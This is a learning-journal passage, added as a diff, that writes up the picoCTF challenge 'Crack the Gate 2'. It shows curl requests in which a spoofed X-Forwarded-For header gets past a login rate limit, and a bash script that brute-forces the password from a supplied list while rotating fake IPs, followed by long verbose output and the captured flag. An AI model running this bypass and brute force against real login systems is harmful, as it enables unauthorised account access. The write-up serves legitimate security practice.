@@ -2,6 +2,864 @@
 
 Current project: [[https://github.com/rafaelbeirigo/odin-css-exercises/][Web Development Foundations Course from The Odin Project]].
 
+* [2025-10-20 Mon]
+
+** picoCTF
+
+Today I finished the last Easy challenge they have.
+It was 81 in total.
+There are still two to solve, but they are under maintenance.
+
+I also started the Medium level ones.
+They are somehow clearer than the Easy ones (maybe because they go deep on a specific detail of a subject).
+
+Here's the last one I solved:
+
+*** Crack the Gate 2
+**** Instructions and commentaries
+
+We are given a link to a login page.
+
+The instructions say:
+
+- The login system has been upgraded with
+
+- a basic rate-limiting mechanism that
+
+  - locks out
+
+  - repeated failed attempts
+
+  - from the same source.
+
+- We’ve received a tip that
+
+  - the system might still trust
+
+  - user-controlled headers.
+
+- Your objective is to
+
+  - bypass the rate-limiting restriction and
+
+  - log in using the known email address: ctf-player@picoctf.org and
+
+  - uncover the hidden secret.
+
+We are also given the following Hints:
+
+- What IP does the server think you’re coming from?
+- Read more about [[https://www.typeerror.org/docs/http/headers/x-forwarded-for][X-forwarded-For]].
+- You can rotate fake IPs to bypass rate limits.
+
+**** Download assets
+#+begin_src shell
+2>&1 wget https://challenge-files.picoctf.net/c_amiable_citadel/d168d254b68d30726076de06aab9b9b74c5470344ec974360f5a9045c6398b17/passwords.txt
+#+end_src
+
+#+RESULTS:
+#+begin_example
+--2025-10-20 18:25:19--  https://challenge-files.picoctf.net/c_amiable_citadel/d168d254b68d30726076de06aab9b9b74c5470344ec974360f5a9045c6398b17/passwords.txt
+Resolving challenge-files.picoctf.net (challenge-files.picoctf.net)... 108.158.186.79, 108.158.186.39, 108.158.186.116, ...
+Connecting to challenge-files.picoctf.net (challenge-files.picoctf.net)|108.158.186.79|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 179 [application/octet-stream]
+Saving to: ‘passwords.txt’
+
+     0K                                                       100%  418M=0s
+
+2025-10-20 18:25:21 (418 MB/s) - ‘passwords.txt’ saved [179/179]
+
+#+end_example
+
+Asset ~passwords.txt~:
+
+#+begin_example
+tkY83OwR
+vISQRFmM
+471HtPne
+s8nXfR6X
+WoQEk5GL
+eu8z9EFn
+0SMi2c8U
+WlHiKuw6
+0iaXgUGR
+shNKoNrW
+KaqwDEUA
+eSqOLef7
+CueFICmh
+MZZSJucZ
+eZQR9yx7
+sPEIun6X
+p0fkX9cA
+CY1sEmC6
+M707m17w
+8thnKYYn
+#+end_example
+
+**** Is it possible to circumvent rate-limiting by spoofing IP via POST header X-Forwarded-For? Yes
+
+I tried to login via the web page once, and got the command below.
+Running it again here, using cURL.
+
+#+begin_src shell
+2>&1 curl -v 'http://amiable-citadel.picoctf.net:57381/login' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate' \
+  -H 'Referer: http://amiable-citadel.picoctf.net:57381/' \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: http://amiable-citadel.picoctf.net:57381' \
+  -H 'Connection: keep-alive' \
+  -H 'Priority: u=0' \
+  --data-raw '{"email":"ctf-player@picoctf.org","password":"whatever"}'
+#+end_src
+
+#+RESULTS:
+#+begin_example
+Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57381...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57381 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57381
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 429 Too Many Requests
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 85
+< ETag: W/"55-BeJP6dUudMpXjI0h8c0UICFySpk"
+< Date: Mon, 20 Oct 2025 23:35:31 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [85 bytes data]
+100   141  100    85  100    56    160    105 --:--:-- --:--:-- --:--:--   266
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false,"error":"Too many failed attempts. Please try again in 20 minutes."}
+#+end_example
+
+It applied the rate-limiting.
+
+Now trying again, using the header ~X-Forwarded-For~ to spoof my IP.
+
+#+begin_src shell
+2>&1 curl -v 'http://amiable-citadel.picoctf.net:57381/login' \
+  -X POST \
+  -H 'X-Forwarded-For: 1.2.3.4' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate' \
+  -H 'Referer: http://amiable-citadel.picoctf.net:57381/' \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: http://amiable-citadel.picoctf.net:57381' \
+  -H 'Connection: keep-alive' \
+  -H 'Priority: u=0' \
+  --data-raw '{"email":"ctf-player@picoctf.org","password":"whatever"}'
+#+end_src
+
+#+RESULTS:
+#+begin_example
+Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57381...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57381 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57381
+> X-Forwarded-For: 1.2.3.4
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:38:09 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     36    119 --:--:-- --:--:-- --:--:--   155100    73  100    17  100    56     36    119 --:--:-- --:--:-- --:--:--   155
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}
+#+end_example
+
+It did *not* apply the rate-limiting!
+
+**** Brute-force attack login with provided list of passwords
+
+[[file:login.sh][login.sh]] ≡
+
+#+begin_src shell
+#!/bin/bash
+
+# Part of the IP that will change for each request
+I=1
+
+cat passwords.txt | \
+    while read PWD
+    do
+        # Get a new IP
+        2>&1 curl -v 'http://amiable-citadel.picoctf.net:57780/login' \
+             -X POST \
+             -H 'X-Forwarded-For: 1.2.3.'$I \
+             -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0' \
+             -H 'Accept: */*' \
+             -H 'Accept-Language: en-US,en;q=0.5' \
+             -H 'Accept-Encoding: gzip, deflate' \
+             -H 'Referer: http://amiable-citadel.picoctf.net:57381/' \
+             -H 'Content-Type: application/json' \
+             -H 'Origin: http://amiable-citadel.picoctf.net:57381' \
+             -H 'Connection: keep-alive' \
+             -H 'Priority: u=0' \
+             --data-raw '{"email":"ctf-player@picoctf.org","password":"'$PWD'"}'
+
+        # Change a part of the IP for the next request
+        I=$(( $I + 1 ))
+    done
+#+end_src
+
+#+RESULTS:
+#+begin_example
+Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.1
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:16 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     20     67 --:--:-- --:--:-- --:--:--    87
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.2
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:17 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     20     68 --:--:-- --:--:-- --:--:--    89
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.3
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:18 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     70 --:--:-- --:--:-- --:--:--    92100    73  100    17  100    56     21     70 --:--:-- --:--:-- --:--:--    92
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.4
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:19 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.5
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:20 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     20     68 --:--:-- --:--:-- --:--:--    89
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.6
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 132
+< ETag: W/"84-GgUl5OLUlonh/YEAoxXrH+ecwrc"
+< Date: Mon, 20 Oct 2025 23:52:20 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [132 bytes data]
+100   188  100   132  100    56    159     67 --:--:-- --:--:-- --:--:--   226
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{xff_byp4ss_brut3_1cc3b76e}"}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.7
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:21 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     71 --:--:-- --:--:-- --:--:--    92
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.8
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:22 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.9
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:23 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     28     93 --:--:-- --:--:-- --:--:--   121100    73  100    17  100    56     28     93 --:--:-- --:--:-- --:--:--   121
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.10
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:23 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.11
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:24 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.12
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:25 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.13
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:26 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.14
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:27 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     28     93 --:--:-- --:--:-- --:--:--   121
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.15
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
